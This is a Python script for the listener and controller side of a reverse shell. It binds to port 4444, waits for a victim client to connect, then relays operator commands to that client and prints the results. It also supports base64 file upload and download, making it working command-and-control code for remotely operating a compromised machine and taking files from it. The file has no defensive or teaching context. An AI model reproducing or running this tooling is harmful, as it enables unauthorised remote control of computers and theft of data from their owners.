import socket
from colorama import Fore, Style, init
import json
import base64

# Initialize colorama
init(autoreset=True)

# Server configuration
HOST = "127.0.0.1"  # Replace with your server's IP address
PORT = 4444  # Replace with your desired port

# Print starting message
print(Fore.GREEN + "Starting TCP Handler...")

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

# Wait for a connection
print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
client_socket, client_address = server.accept()
print(Fore.GREEN + f"Connection established with {client_address}")

# Helper functions for upload and download
def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Upload successful [+]"

def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()

try:
    while True:
        # Receive the prompt from the client
        prompt = client_socket.recv(1024).decode("utf-8")
        print(Fore.CYAN + prompt, end="")

        # Get user input
        command = input()

        # Send the command to the client
        client_socket.sendall(command.encode("utf-8"))

        if command.lower() == "km":
            print(Fore.RED + "Disconnecting from client...")
            client_socket.close()
            break

        # Handle upload and download commands
        if command.startswith("upload"):
            _, file_path = command.split(" ", 1)
            file_content = client_socket.recv(4096).decode("utf-8")
            print(Fore.WHITE + write_file(file_path, file_content))
            continue
        elif command.startswith("download"):
            _, file_path = command.split(" ", 1)
            file_content = read_file(file_path)
            client_socket.sendall(file_content.encode("utf-8"))
            continue

        # Receive the output from the client
        output = client_socket.recv(4096).decode("utf-8")
        print(Fore.WHITE + output)

except KeyboardInterrupt:
    print(Fore.RED + "\nShutting down the server.")
    client_socket.close()
    server.close()
